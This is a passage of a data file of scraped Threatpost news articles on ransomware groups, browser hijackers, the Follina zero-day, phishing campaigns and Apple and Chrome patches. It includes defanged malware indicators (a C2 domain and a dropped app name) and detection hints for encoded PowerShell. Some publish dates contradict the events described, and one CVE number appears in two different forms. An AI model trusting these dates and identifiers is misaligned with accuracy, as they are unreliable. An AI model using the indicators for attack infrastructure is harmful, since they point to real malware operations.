V8 tracked as CVE-2022-1096 and under active attack also spurred a hasty patch.\nFebruary saw a fix for the first of this year’s Chrome zero-days, a use-after-free flaw in Chrome’s Animation component tracked as CVE-2022-0609 that already was under attack.\nLater it was revealed that North Korean hackers were exploiting the flaw weeks before it was discovered and patched.","num_sentences":23,"metadata":{"source":"blog","platform":"threatPost","filename":"Google-Patches"}}
{"id":171,"title":"Emerging H0lyGh0st Ransomware Tied to North Korea | Threatpost","publish_date":"2021-06-28","link":"https://threatpost.com/h0lygh0st-ransomware-north-korea/180232/","clean_text":"Microsoft researchers have linked an emerging ransomware threat that already has compromised a number of small-to-mid-sized businesses to financially motivated North Korean state-sponsored actors that have been active since last year.\nA group tracked by researchers from Microsoft Threat Intelligence Center (MSTIC) as DEV-0530 but that calls itself H0lyGh0st has been developing and using ransomware in attacks since June 2021.\nThe group has successfully compromised small-to-mid-sized businesses—including manufacturing organizations, banks, schools, and event and meeting planning companies—in multiple countries starting as early as September, researchers from MTIC and Microsoft Digital Security Unit (MDSU) said in a blog post published Thursday.\nH0lyGh0st’s standard modus operandi is to use a namesake ransomware to encrypt all files on the target device using the file extension .h0lyenc, then send the victim a sample of the files as proof.\nThe group interacts with victims on a .onion site that it maintains and on which it provides a contact form for victims to get in touch, researchers said. [\nFREE On-demand Event: Join Keeper Security’s Zane Bond in a Threatpost roundtable and learn how to securely access your machines from anywhere and share sensitive documents from your home office.\nWATCH HERE.]\nThe group typically demands payment in Bitcoin in exchange for restoring access to the files.\nOn its website, H0lyGh0st claims that it won’t sell or publish victim data if they pay, researchers said.\nHowever, it uses double extortion to pressure targets to pay, threatening to publish stolen data on social media or send it to the victims’ customers if they don’t meet ransom demands.\nIntroducing H0lyGh0st H0lyGh0st’s ransomware campaigns are financially motivated, with researchers observing text linked to a ransom note that they intercepted in which attackers claim they aim to “close the gap between the rich and poor,” researchers said. “\nThey also attempt to legitimize their actions by claiming to increase the victim’s security awareness by letting the victims know more about their security posture,” they said.\nDEV-0530 also has connections with another North Korean-based group tracked as PLUTONIUM, also known as DarkSeoul or Andariel, according to MSTIC, with researchers observing communications between the two groups.\nH0lyGh0st also has been seen using tools created exclusively by PLUTONIUM, they said.\nA Tale of Two Families Since it began using ransomware in June 2021 and until May 2022, H0lyGh0st has employed two custom-developed malware families–SiennaPurple and SiennaBlue, researchers said.\nMSTIC identified four variants linked to these families: BTLC_C.exe, HolyRS.exe, HolyLock.exe, and BLTC.exe.\nBTLC_C.exe is written in C++ and is classified as SiennaPurple, while the rest are written in the open-source Go programming language, researchers said.\nAll of the variants are compiled into .exe to target Windows systems, they said.\nBLTC_C.exe is a portable ransomware developed by the group that was first seen in June 2021.\nHowever, it may have been an early version of the group’s development efforts, as it doesn’t have many features compared to all malware variants in the SiennaBlue family, researchers said.\nLater in the group’s evolution, between October 2021 and May 2022, MSTIC observed a cluster of new DEV-0530 ransomware variants written in Go, which they classify as SiennaBlue variants, they said.\nThough new Go functions have been added to the various variants over time, all the ransomware in the SiennaBlue family share the same core Go functions, researchers observed.\nThese features include various encryption options, string obfuscation, public key management, and support for the internet and intranet, researchers said.\nMost Recent Variant The latest ransomware variant to be used by the group is BTLC.exe, which researchers have seen in the wild since April of this year, they said.\nBTLC.exe can be configured to connect to a network share using the default username, password, and intranet URL hardcoded in the malware if the ServerBaseURL is not accessible from the device, researchers said.\nThe malware also includes a persistence mechanism in which it creates or deletes a scheduled task called lockertask that can launch the ransomware.\nOnce the malware is successfully launched as an administrator, it tries to connect to the default ServerBaseURL hardcoded in the malware, attempts to upload a public key to the C2 server, and encrypts all files in the victim’s drive, they said.\nFREE On-demand Event: Join Keeper Security’s Zane Bond in a Threatpost roundtable and learn how to securely access your machines from anywhere and share sensitive documents from your home office.\nWATCH HERE.","num_sentences":29,"metadata":{"source":"blog","platform":"threatPost","filename":"H0lyGh0st"}}
{"id":172,"title":"ChromeLoader Browser Hijacker Provides Gateway to Bigger Threats | Threatpost","publish_date":null,"link":"https://threatpost.com/chromeloader-hijacker-threats/179761/","clean_text":"ChromeLoader may seem on the surface like a run-of-the-mill browser hijacker that merely redirects victims to advertisement websites.\nHowever, its use of PowerShell could pose a greater risk by leading to further and advanced malicious activity, such as the propagation of ransomware or spyware or theft of browser-session data.\nResearchers are warning of the potential for ChromeLoader—which has seen a resurgence in activity recently—to pose a more sophisticated threat than typical malvertisers do, according to two separate blog posts by Malwarebytes Labs and Red Canary.\nChromeLoader is a pervasive and persistent browser hijacker that eventually manifests as a browser extension, modifying victims’ Chrome settings and redirecting user traffic to advertisement websites.\nOn Windows machines, victims become infected with the malware through ISO files that poses as a cracked video game or pirated films or TV programs, researchers said.\nHowever, ChromeLoader is platform agnostic, which means users of macOS also are at risk from infection, according to a blog post from Malwarebytes Lead Malware Intelligence Analyst Christopher Boyd.\nHowever, instead of lurking in ISO files, attackers use DMG (Apple Disk Image) files, a more common macOS format, to hide ChromeLoader, he said.\nWhile its core functionality is fairly benign, ChromeLoader has a unique feature in that it uses PowerShell to inject itself into the browser and add a malicious extension to it—”a technique we don’t see very often (and one that often goes undetected by other security tools),” warned Aedan Russell from Red Canary’s Detection Engineering team in a blog post. “\nIf applied to a higher-impact threat—such as a credential harvester or spyware—this PowerShell behavior could help malware gain an initial foothold and go undetected before performing more overtly malicious activity, like exfiltrating data from a user’s browser sessions,” he wrote.\nThe Infection Process ChromeLoader lurks in bogus files that are promoted on Twitter and through other services, or found on rogue and torrent sites offering pirated video games and other media for free download, researchers said. “\nSome social media posts promote supposedly cracked Android games via QR codes which direct would-be gamers to rogue websites,” Boyd explained.\nDouble clicking the ISO file mounts it as a virtual CD-ROM, with the ISO’s executable claiming to be the content that the victim originally was looking for, he wrote. “\nWithin this ISO is an executable used to install ChromeLoader, along with what appears to be a .NET wrapper for the Windows Task Scheduler,” according to Red Canary’s Russell. “\nThis is how ChromeLoader maintains its persistence on the victim’s machine later in the intrusion chain.”\nOnce installed, ChromeLoader uses a PowerShell command to load in a Chrome extension from a remote resource.\nPowerShell then removes the scheduled task so the victim has no idea that their browser has been compromised, Boyd said. “\nAt this point, search results cannot be trusted and bogus entries will be displayed to the user,” he wrote.\nChromeLoader uses the same bait—pirated videos or cracked games—to lure macOS users, but the infection process is a bit different, Russell explained.\nOn macOS machines, ChromeLoader uses aDMG file that contains an installer script that can drop payloads for either Chrome or Safari instead of a portable executable file. “\nWhen executed by the end user, the installer script then initiates cURL to retrieve a ZIP file containing the malicious browser extension and unzips it within the private/var/tmp directory, finally executing Chrome with command-line options to load the malicious extension,” he wrote.\nMitigation and Detection Researchers offered mitigation advice as well as both user- and administrator-level ways to detect if a system has been infected with ChromeLoader.\nOne obvious tip is to avoid downloading pirated software or videos, which Boyd warned “is a very risky business,” not to mention illegal. “\nIf you’re downloading a torrent, you may well be rolling dice with regard to the digital health of your devices,” he wrote.\nUsers also can click on the “More” icon, then “More Tools -> Extensions” from the drop-down list in Chrome to see everything that’s installed, active or disabled, along with additional information about all extensions present.\nFrom there is anything looks dodgy, Google offers steps to reset browser settings or clean things up, he said.\nRed Canary offered more advanced detection tactics based on ChromeLoader’s use of PowerShell to find out if a browser has been infected.\nOne is to search for PowerShell containing a shortened version of the encodedCommand flag in its command line, which can find the execution of encoded PowerShell commands.\nAnother is to looks for instances of the Chrome browser executable spawning from PowerShell with a corresponding command line that includes appdata\\local as a parameter.\nIn macOS, security administrators can search forsh or bash scripts running in macOS environments with command lines associated with the macOS variant of ChromeLoader, as well as the execution of encoded sh, bash, or zsh commands on macOS endpoints to know if a browser has been infected.","num_sentences":29,"metadata":{"source":"blog","platform":"threatPost","filename":"Hijacker"}}
{"id":173,"title":"Cybercriminals Are Selling Access to Chinese Surveillance Cameras | Threatpost","publish_date":null,"link":"https://threatpost.com/cybercriminals-are-selling-access-to-chinese-surveillance-cameras/180478/","clean_text":"New research indicates that over 80,000 Hikvision surveillance cameras in the world today are vulnerable to an 11 month-old command injection flaw.\nHikvision – short for Hangzhou Hikvision Digital Technology – is a Chinese state-owned manufacturer of video surveillance equipment.\nTheir customers span over 100 countries (including the United States, despite the FCC labeling Hikvision “an unacceptable risk to U.S. national security” in 2019).\nLast Fall, a command injection flaw in Hikvision cameras was revealed to the world as CVE-2021-36260.\nThe exploit was given a “critical” 9.8 out of 10 rating by NIST.\nDespite the severity of the vulnerability, and nearly a year into this story, over 80,000 affected devices remain unpatched.\nIn the time since, the researchers have discovered “multiple instances of hackers looking to collaborate on exploiting Hikvision cameras using the command injection vulnerability,” specifically in Russian dark web forums, where leaked credentials have been put up for sale.\nThe extent of the damage done already is unclear.\nThe authors of the report could only speculate that “Chinese threat groups such as MISSION2025/APT41, APT10 and its affiliates, as well as unknown Russian threat actor groups could potentially exploit vulnerabilities in these devices to fulfill their motives (which may include specific geo-political considerations).”\nThe Risk in IoT Devices With stories like this, it’s easy to ascribe laziness to individuals and organizations that leave their software unpatched.\nBut the story isn’t always so simple.\nAccording to David Maynor, senior director of threat intelligence at Cybrary, Hikvision cameras have been vulnerable for many reasons, and for a while. “\nTheir product contains easy to exploit systemic vulnerabilities or worse, uses default credentials.\nThere is no good way to perform forensics or verify that an attacker has been excised.\nFurthermore, we have not observed any change in Hikvision’s posture to signal an increase in security within their development cycle.”\nA lot of the problem is endemic to the industry, not just Hikvision. “\nIoT devices like cameras aren’t always as easy or straightforward to secure as an app on your phone,” Paul Bischoff, privacy advocate with Comparitech, wrote in a statement via email. “\nUpdates are not automatic; users need to manually download and install them, and many users might never get the message.\nFurthermore, IoT devices might not give users any indication that they’re unsecured or out of date.\nWhereas your phone will alert you when an update is available and likely install it automatically the next time you reboot, IoT devices do not offer such conveniences.”\nWhile users are none the wiser, cybercriminals can scan for their vulnerable devices with search engines like Shodan or Censys.\nThe problem can certainly be compounded with laziness, as Bischoff noted, “by the fact that Hikvision cameras come with one of a few predetermined passwords out of the box, and many users don’t change these default passwords.”\nBetween weak security, insufficient visibility and oversight, it’s unclear when or if these tens of thousands of cameras will ever be secured.","num_sentences":23,"metadata":{"source":"blog","platform":"threatPost","filename":"Hikvision"}}
{"id":174,"title":"APT Lazarus Targets Engineers with macOS Malware | Threatpost","publish_date":"2022-02-28","link":"https://threatpost.com/apt-lazarus-macos-malware/180426/","clean_text":"North Korean APT Lazarus is up to its old tricks with a cyberespionage campaign targeting engineers with a fake job posting that attempt to spread macOS malware.\nThe malicious Mac executable used in the campaign targets both Apple and Intel chip-based systems.\nThe campaign, identified by researchers from ESET Research Labs and revealed in a series of tweets posted Tuesday, impersonates cryptocurrency trader Coinbase in a job description claiming to seek an engineering manager for product security, researchers divulged.\nDubbed Operation In(ter)ception, the recent campaign drops a signed Mac executable disguised as a job description for Coinbase, which researchers discovered uploaded to VirusTotal from Brazil, they wrote.\n“Malware is compiled for both Intel and Apple Silicon,” according to one of the tweets. “\nIt drops three files: a decoy PDF document Coinbase_online_careers_2022_07.pdf, a bundle http[://]FinderFontsUpdater[.]app and a downloader safarifontagent.”\nSimilarities to Previous Malware The malware is similar to a sample discovered by ESET in May, which also included a signed executable disguised as a job description, was compiled for both Apple and Intel, and dropped a PDF decoy, researchers said.\nHowever, the most recent malware is signed July 21, according to its timestamp, which means it’s either something new or a variant of the previous malware.\nIt uses a certificate issued in February 2022 to a developer named Shankey Nohria and which was revoked by Apple on Aug. 12, researchers said.\nThe app itself was not notarized.\nOperation In(ter)ception also has a companion Windows version of the malware dropping the same decoy and spotted Aug. 4 by Malwarebytes threat intelligence researcher Jazi, according to ESET.\nThe malware used in the campaign also connects to a different command and control (C2) infrastructure than the malware discovered in May, https:[//]concrecapital[.]com/%user%[.]jpg, which did not respond when researchers tried to connect to it.\nLazarus on the Loose North Korea’s Lazarus is well known as one of the most prolific APTs and already is in the crosshairs of international authorities, having been sanctioned back in 2019 by the U.S. government.\nLazarus is known for targeting academics, journalists and professionals in various industries—particularly the defense industry–to gather intelligence and financial backing for the regime of Kim Jong-un.\nIt has often used impersonation ploys similar to the one observed in Operation In(ter)ception to try to get victims to take the malware bait.\nA previous campaign identified in January also targeted job-seeking engineers by dangling fake employment opportunities at them in a spear-phishing campaign.\nThe attacks used Windows Update as a living-off-the-land technique and GitHub as a C2 server.\nMeanwhile, a similar campaign uncovered last year saw Lazarus impersonating defense contractors Boeing and General Motors and claiming to seek job candidates only to spread malicious documents.\nChanging It Up However, more recently Lazarus has diversified its tactics, with the feds revealing that Lazarus also has been responsible for a number of crypto heists aimed at padding the regime of Jong-un with cash.\nRelated to this activity, the U.S. government levied sanctions against cryptocurrency mixer service Tornado Cash for helping Lazarus launder cash from its cybercriminal activities, which they believe in part are being to fund North Korea’s missile program.\nLazarus even has dipped its toe in ransomware amid its frenzy of cyberextortion activity.\nIn May, researchers at cybersecurity firm Trellix tied the recently emerged VHD ransomware to the North Korean APT.","num_sentences":22,"metadata":{"source":"blog","platform":"threatPost","filename":"Lazarus"}}
{"id":175,"title":"Evil Corp Pivots LockBit to Dodge U.S. Sanctions | Threatpost","publish_date":"2019-12-28","link":"https://threatpost.com/evil-corp-pivots-to-lockbit-to-dodge-u-s-sanctions/179858/","clean_text":"Evil Corp has shifted tactics once again, this time pivoting to LockBit ransomware after U.S. sanctions have made it difficult for the cybercriminal group to reap financial gain from its activity, researchers have found.\nResearchers from Mandiant Intelligence have been tracking a “financially motivated threat cluster” they’re calling UNC2165 that has numerous overlaps with Evil Corp and is highly likely the latest incarnation of the group.\nUNC2165 is using a combination of the FakeUpdates infection chain to gain access to target networks followed by the LockBit ransomware, researchers wrote in a report published Thursday.\nThe activity appears to represent “another evolution in Evil Corp affiliated actors’ operations,” they wrote. “\nNumerous reports have highlighted the progression of linked activity including development of new ransomware families and a reduced reliance on Dridex to enable intrusions,” researchers wrote. “\nDespite these apparent efforts to obscure attribution, UNC2165 has notable similarities to operations publicly attributed to Evil Corp.” The U.S. Treasury Department’s Office of Foreign Assets Control (OFAC) sanctioned Evil Corp in December 2019 in a widespread crackdown on the dangerous and prolific cybercriminal group best known for spreading the aforementioned info-stealing Dridex malware and later its own WastedLocker ransomware.\nThe sanctions basically forbid any U.S. entity from doing business or being associated with Evil Corp, effectively preventing ransomware negotiation firms from facilitating ransom payments for the group–obviously limiting its ability to profit from criminal activity.\nShapeshifting Cybercriminals Evil Corp took a brief hiatus after the sanctions and a subsequent indictment of its leaders, but since has cloaked itself through clever rebranding to continue its nefarious activity.\nIndeed, its latest pivot is not the first time the group used a different identity to try to skirt sanctions against it.\nAbout a year ago, Evil Corp tried to mask itself by using previously unknown ransomware called PayloadBin, which researchers determined was likely a rebrand of its own ransomware, WastedLocker, according to reports.\nBefore that the group resurfaced briefly soon after the OFAC sanctions were levied with new tactics to try to hide its activity, leveraging the oft-used threat tool HTML redirectors–or code that uses meta refresh tags to redirect users to another website–to drop payloads through malicious Excel files.\nMost Recent Incarnation The latest activity from Evil Corp “almost exclusively” gains access to victims’ networks on the back of a group tracked as UNC1543, to which the use of FakeUpdates has been linked, according to Mandiant.\nIn the months prior to the government’s indictments of Evil Corp, this method was used as the initial infection vector for Dridex and the BitPaymer and DoppelPaymer ransomware.\nEvil Corp also is deploying other ransomware—specifically Hades–in its activity as UNC2165, researchers said. “\nHades has code and functional similarities to other ransomware believed to be associated with Evil Corp-affiliated threat actors,” they said.\nThe use of other ransomware is indeed a “natural evolution” for this emerging criminal group to distance itself from Evil Corp, researchers said.\nHowever, LockBit more than Hades especially is a natural fit because of its RaaS model and rise to prominence in recent years, they said.\nIndeed, LockBit has taken down some big-name targets in its own right, such as Accenture and Bangkok Air, in the last year. “\nUsing this RaaS would allow UNC2165 to blend in with other affiliates,” researchers wrote. “\nAdditionally, the frequent code updates and rebranding of HADES required development resources and it is plausible that UNC2165 saw the use of LOCKBIT as a more cost-effective choice.”\nThe Move Makes Sense Since ransomware operators see their operations as any other business leaders would, it makes sense that they also have to evolve with the times to stay ahead in the market and maintain profit just like anyone else, noted a security professional. “\nFor cybercriminals, it’s a similar concept,” observed James McQuiggan, security awareness advocate at security firm KnowBe4, said in an email to Threatpost. “\nThey need to continually develop their applications and encryption to avoid detection and make money via extortion using various methods.”\nGiven this perspective, it’s not surprising that Evil Corp is leveraging other ransomware to continue to stay relevant and, more importantly, get paid, he said.\nAnd with Evil Corp cloaking itself in the activity of other ransomware groups, targets likely will pay an extortion fee, as they would not be aware of the government sanctions against the true perpetrators of the crime, McQuiggan said.","num_sentences":25,"metadata":{"source":"blog","platform":"threatPost","filename":"LockBit"}}
{"id":176,"title":"New Magniber Ransomware Targets South Korea, Asia Pacific | Threatpost","publish_date":null,"link":"https://threatpost.com/new-magniber-ransomware-targets-south-korea-asia-pacific/128567/","clean_text":"Researchers identified a new ransomware family called Magniber that uniquely targets only users in South Korea and the Asia-Pacific regions.\nThe ransomware is primarily being distributed by the Magnitude exploit kit, a primary distribution vehicle in the past for Cerber ransomware.\nBecause of Magniber’s close affiliation to both the Magnitude EK and and Cerber, researchers are calling the new ransomware Magniber, a mashup of both names. “\nMagnitude EK activity fell off the radar until Oct. 15, 2017, when it came back and began focusing solely on South Korea.\nPreviously it had been distributing Cerber ransomware, but Cerber distribution has declined and now it is distributing ransomware known as Magniber,” wrote FireEye in a report released Thursday on the new ransomware strain.\nOver the past few days other researchers have also spotted similar Magniber activity.\nTrend Micro noted Magnitude EK activity had vanished briefly two week prior to the Oct. 15 Magniber attacks.\nResearchers there also said that while ransomware Cerber, SLocker and Locky often were used in focused attacks they had never targeted assaults on specific geographic regions.\nAs for the malware’s payload, Magniber ransomware will not execute if the system language is not Korean, according to FireEye researchers Muhammad Umair, Zain Gardezi and Shahzad Ahmad who co-authored the report. “\nThe malware calls GetSystemDefaultUILanguage, and if the system language is not Korean, it exits,” FireEye said.\nMagniber encrypts user data using AES128, researchers at FireEye said, noting its Magniber sample differed from that found by other researchers. “\nThe malware contains a binary payload in its resource section encrypted in reverse using RC4.\nIt starts unpacking it from the end of the buffer to its start.\nReverse RC4 decryption keys are 30 bytes long and also contain non-ASCII characters,” researchers said.\nAfter unpacking in memory, the malware starts executing the contents of the payload.\nPart of that process includes using a 19-character long pseudorandom string to constructs 4 URLs for callbacks used to identify and avoid executing the ransomware on a virtual machine.\nIf the Magniber ransomware is executed, the malware then starts to encrypt user files on the system, renaming them by adding a “.ihsdj” extension to the end.\nOnce it’s accomplished this task, the malware then issues a command to delete itself.\nAccording to Trend Micro, hackers are using the Magnitude EK in conjunction with malvertising campaigns and exploiting a memory corruption vulnerability (CVE-2016-0189) in Internet Explorer (9 through 11), patched last year. “\nWhile the current threat landscape suggests a large portion of attacks are coming from emails, exploit kits continue to put users at risk – especially those running old software versions and not using ad blockers,” FireEye researchers noted.","num_sentences":20,"metadata":{"source":"blog","platform":"threatPost","filename":"Magniber"}}
{"id":177,"title":"Microsoft Releases Workaround for ‘One-Click’ 0Day Under Active Attack | Threatpost","publish_date":"2020-08-28","link":"https://threatpost.com/microsoft-workaround-0day-attack/179776/","clean_text":"Microsoft has released a workaround for a zero-day flaw that was initially flagged in April and that attackers already have used to target organizations in Russia and Tibet, researchers said.\nThe remote control execution (RCE) flaw, tracked as CVE-2022-3019, is associated with the Microsoft Support Diagnostic Tool (MSDT), which, ironically, itself collects information about bugs in the company’s products and reports to Microsoft Support.\nIf successfully exploited, attackers can install programs, view, change or delete data, or create new accounts in the context allowed by the user’s rights, the company said. “\nA remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word,” Microsoft explained in its guidance on the Microsoft Security Response Center. “\nAn attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application.”\nMicrosoft’s workaround comes some six weeks after the vulnerability was apparently first identified.\nResearchers from Shadow Chaser Group noticed it on April 12 in a bachelor’s thesis from August 2020—with attackers apparently targeting Russian users–and reported to Microsoft on April 21, according to research firm Recorded Future’s The Record.\nA Malwarebytes Threat Intelligence analyst also spotted the flaw back in April but could not fully identify it, the company said in a post on Twitter over the weekend, retweeting the original post about the vulnerability, also made on April 12, from @h2jazi.\nWhen the flaw was reported, Microsoft didn’t consider it an issue.\nIt’s clear now that the company was wrong, and the vulnerability again raised the attention of researchers at Japanese security vendor Nao Sec, who tweeted a fresh warning about it over the weekend, noting that it was being used to target users in Belarus.\nIn analysis over the weekend noted security researcher Kevin Beaumont dubbed the vulnerability “Follina,” explaining the zero-day code references the Italy-based area code of Follina – 0438.\nCurrent Workaround While no patch yet exists for the flaw, Microsoft is recommending that affected users disable the MSDT URL to mitigate it for now.\nThis “prevents troubleshooters being launched as links including links throughout the operating system,” the company wrote in their advisory.\nTo do this, users must follow these steps: Run “:Command Prompt as Administrator“; Back up the registry key by executing the command “reg export HKEY_CLASSES_ROOT\\ms-msdt filename“; and execute the command “reg delete HKEY_CLASSES_ROOT\\ms-msdt /f”. “\nTroubleshooters can still be accessed using the Get Help application and in system settings as other or additional troubleshooters,” the company said.\nMoreover, if the calling application is an Office app then by default, Office opens the document from the internet in Protected View and Application Guard for Office, “both of which prevent the current attack,” Microsoft said.\nHowever, Beaumont refuted that assurance in his analysis of the bug.\nMicrosoft also plans to update CVE-2022-3019 with further information but did not specify when it would do so, according to the advisory.\nSignificant Risk In the meantime, the unpatched flaw poses a significant risk for a number of reasons, Beaumont and other researchers noted.\nOne is that it affects such a wide swathe of users, given that it exists in all currently supported Windows versions and can be exploited via Microsoft Office versions 2013 through Office 2019, Office 2021, Office 365, and Office ProPlus. “\nEvery organization that is dealing with content, files and in particular Office documents, which is basically everyone in the globe, is currently exposed to this threat,” Aviv Grafi, CTO and founder of security firm Votiro, wrote in an e-mail to Threatpost.\nAnother reason the flaw poses a major threat is its execution without action from end users, both Beaumont and Grafi said.\nOnce the HTML is loaded from the calling application, an MSDT scheme is used to execute a PowerShell code to run a malicious payload, Grafi explained.\nSince the flaw is abusing the remote template feature in Microsoft Word, it is not dependent on a typical macro-based exploit path, which are common within Office-based attacks, Beaumont said. “\nWhat makes this vulnerability so difficult to avoid is the fact that the end user does not have to enable macros for the code to execute, making it a ‘zero-click’ remote code execution technique used through MSDT,” Grafi concurred.\nUnder Active Attack Claire Tills, senior research engineer for security firm Tenable, compared the flaw to last year’s zero-click MSHTML bug, tracked as CVE-2021-40444, which was pummeled by attackers, including the Ryuk ransomware gang. “\nGiven the similarities between CVE-2022-30190 and CVE-2021-40444, and that researchers speculate other protocol handlers may also be vulnerable, we expect to see further developments and exploitation attempts of this issue,” she wrote in an e-mail to Threatpost.\nIndeed, threat actors already have pounced on the vulnerability.\nOn Monday, Proofpoint Threat Insight also tweeted that threat actors were using the flaw to target organizations in Tibet by impersonating the “Women Empowerments Desk” of the Central Tibetan Administration.\nWhat’s more, the workaround that Microsoft currently offers itself has issues and won’t provide much of a fix in the long-term, especially with the bug under attack, Grafi said.\nHe said the workaround is”not friendly for admins” because it involves “changes in the Registry of the end user’s endpoints.”","num_sentences":31,"metadata":{"source":"blog","platform":"threatPost","filename":"Microsoft"}}
{"id":178,"title":"Fake Reservation Links Prey on Weary Travelers | Threatpost","publish_date":null,"link":"https://threatpost.com/reservation-links-prey-on-travelers/180462/","clean_text":"A longtime threat group identified as TA558 has ramped up efforts to target the travel and hospitality industries.\nAfter a lull in activity, believed tied to COVID-related travel restrictions, the threat group has ramped up campaigns to exploit an uptick in travel and related airline and hotel bookings.\nWarnings come from security researchers who say TA558 cybercriminals have revamped their 2018 campaigns with fake reservation emails that contain links – that if clicked – deliver a malicious malware payload containing a potpourri of malware variants.\nWhat makes this most recent campaign unique, according to a report by Proofpoint, is the use of RAR and ISO file attachments linked to messages.\nISO and RAR are single compressed files, that if executed, decompress the file and folder data inside of them. “\nTA558 began using URLs more frequently in 2022.\nTA558 conducted 27 campaigns with URLs in 2022, compared to just five campaigns total from 2018 through 2021.\nTypically, URLs led to container files such as ISOs or zip [RAR] files containing executables,” Proofpoint wrote.\nTo become infected, the targeted victim would have to be tricked into decompressing the file archive. “\nThe reservation link… led to an ISO file and an embedded batch file.\nThe execution of the BAT file led to a PowerShell helper script that downloaded a follow-on payload, AsyncRAT,” researchers wrote.\nUpgrade Your Itinerary To Malware Infection Status Past TA558 campaigns, tracked by Palo Alto Networks (in 2018), Cisco Talos (in 2020 and 2021) and Uptycs (in 2020), have leveraged malicious Microsoft Word document attachments (CVE-2017-11882) or remote template URLs to download and install malware, according to Proofpoint.\nThe shift to ISO and RAR files “is likely due to Microsoft’s announcements in late 2021 and early 2022 about disabling macros [VBA and XL4] by default in Office products,” researchers said. “\nIn 2022, campaign tempo increased significantly.\nCampaigns delivered a mixture of malware such as, Loda, Revenge RAT, and AsyncRAT.\nThis actor used a variety of delivery mechanisms including URLs, RAR attachments, ISO attachments, and Office documents,” researchers wrote.\nMalware payloads of recent campaigns typically include remote access trojans (RATs), that can enable reconnaissance, data theft and distribution of follow-on payloads, Proofpoint said.\nThrough all their evolutions, though, the goal of the group has always remained the same.\nThe analysts concluded “with medium to high confidence” that TA558 is financially motivated, using stolen data to scale up and steal money. “\nIts possible compromises could impact both organizations in the travel industry as well as potentially customers who have used them for vacations,” Sherrod DeGrippo, vice president of threat research and detection organizations at Proofpoint, wrote in a statement. “\nOrganizations in these and related industries should be aware of this actor’s activities and take precautions to protect themselves.”\nTA558’s History Since at least 2018, TA558 has primarily targeted organizations in the fields of travel, hospitality, and related industries.\nThose organizations tend to be located in Latin America, and sometimes in North America or Western Europe.\nThroughout their history, TA558 has used socially engineered emails to lure victims into clicking on malicious links or documents.\nThose emails – most often written in Portuguese or Spanish – usually purported to concern hotel reservations.\nThe subject line, or the name of the attached document, was often, simply, “reserva.”\nIn their early exploits, the group would leverage vulnerabilities in Microsoft Word’s Equation Editor – for example, CVE-2017-11882, a remote code execution bug.\nThe goal was to download a RAT – most commonly Loda or Revenge RAT – to the target machine.\nIn 2019 the group expanded its arsenal, with malicious macro-laced Powerpoint attachments and template injections against Office documents.\nThey also expanded to new demographics, utilizing English-language phishing lures for the first time.\nEarly 2020 was TA558’s most prolific period, as they churned out 25 malicious campaigns in January alone.\nThey predominantly used macro-laden Office documents, or targeted known Office vulnerabilities during this period. “\nOrganizations, especially those operating in targeted sectors in Latin America, North America, and Western Europe should be aware of this actor’s tactics, techniques, and procedures,” researchers advise.","num_sentences":33,"metadata":{"source":"blog","platform":"threatPost","filename":"TA558"}}
{"id":179,"title":"iPhone Users Urged to Update to Patch 2 Zero-Days | Threatpost","publish_date":null,"link":"https://threatpost.com/iphone-users-urged-to-update-to-patch-2-zero-days-under-attack/180448/","clean_text":"Apple is urging macOS, iPhone and iPad users immediately to install respective updates this week that includes fixes for two zero-days under active attack.\nThe patches are for vulnerabilities that allow attackers to execute arbitrary code and ultimately take over devices.\nPatches are available for effected devices running iOS 15.6.1 and macOS Monterey 12.5.1.\nPatches address two flaws, which basically impact any Apple device that can run either iOS 15 or the Monterey version of its desktop OS, according to security updates released by Apple Wednesday.\nOne of the flaws is a kernel bug (CVE-2022-32894), which is present both in iOS and macOS.\nAccording to Apple it is an “out-of-bounds write issue [that] was addressed with improved bounds checking.”\nThe vulnerability allows an application to execute arbitrary code with kernel privileges, according to Apple, which, in usual vague fashion, said there is a report that it “may have been actively exploited.”\nThe second flaw is identified as a WebKit bug (tracked as CVE-2022-32893), which is an out-of-bounds write issue that Apple addressed with improved bounds checking.\nThe flaw allows for processing maliciously crafted web content that can lead to code execution, and also has been reported to be under active exploit, according to Apple.\nWebKit is the browser engine that powers Safari and all other third-party browsers that work on iOS.\nPegasus-Like Scenario The discovery of both flaws, about which little more beyond Apple’s disclosure are known, was credited to an anonymous researcher.\nOne expert expressed worry that the latest Apple flaws “could effectively give attackers full access to device,” they might create a Pegasus-like scenario similar to the one in which nation-state APTs barraged targets with spyware made by Israeli NSO Group by exploiting an iPhone vulnerability. “\nFor most folks: update software by end of day,” tweeted Rachel Tobac, the CEO of SocialProof Security, regarding the zero-days. “\nIf threat model is elevated (journalist, activist, targeted by nation states, etc): update now,” Tobac warned.\nZero-Days Abound The flaws were unveiled alongside other news from Google this week that it was patching its fifth zero-day so far this year for its Chrome browser, an arbitrary code execution bug under active attack.\nThe news of yet more vulnerabilities from top tech vendors being barraged by threat actors demonstrates that despite the best efforts from top-tier tech companies to address perennial security issues in their software, it remains an uphill battle, noted Andrew Whaley, senior technical director at Promon, a Norwegian app security company.\nThe flaws in iOS are especially worrying, given the ubiquity of iPhones and users’ utter reliance on mobile devices for their daily lives, he said.\nHowever, the onus is not only on vendors to protect these devices but also for users to be more aware of existing threats, Whaley observed. “\nWhile we all rely on our mobile devices, they are not invulnerable, and as users we need to maintain our guard just like we do on desktop operating systems,” he said in an email to Threatpost.\nAt the same time, developers of apps for iPhones and other mobile devices also should add an extra layer of security controls in their technology so they are less reliant on OS security for protection, given the flaws that frequently crop up, Whaley observed. “\nOur experience shows that this is not happening enough, potentially leaving banking and other customers vulnerable,” he said.","num_sentences":21,"metadata":{"source":"blog","platform":"threatPost","filename":"iPhone-Users"}}
